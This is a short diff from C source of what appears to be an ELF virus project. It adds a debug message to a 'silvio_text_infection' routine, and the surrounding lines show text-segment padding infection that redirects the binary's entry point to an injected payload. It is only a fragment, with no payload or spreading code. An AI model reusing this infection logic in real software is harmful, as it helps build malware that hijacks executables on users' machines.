@@ -14,6 +14,8 @@
 
 void silvio_text_infection(t_famine *famine)
 {
+    if (DEBUG == true)
+        printf("Applying silvio_text infection.\n");
     // Create the output file
     if (!(famine->infected_file = malloc(famine->binary_data_size + PAGE_SIZE)))
     {
@@ -25,7 +27,6 @@ void silvio_text_infection(t_famine *famine)
     {
         if (is_text_segment(famine->phdr[i]))
         {
-
             famine->payload_vaddr = famine->text_p_vaddr + famine->phdr[i].p_filesz;
             famine->ehdr->e_entry = famine->payload_vaddr;
             famine->new_entry_point = famine->payload_vaddr;
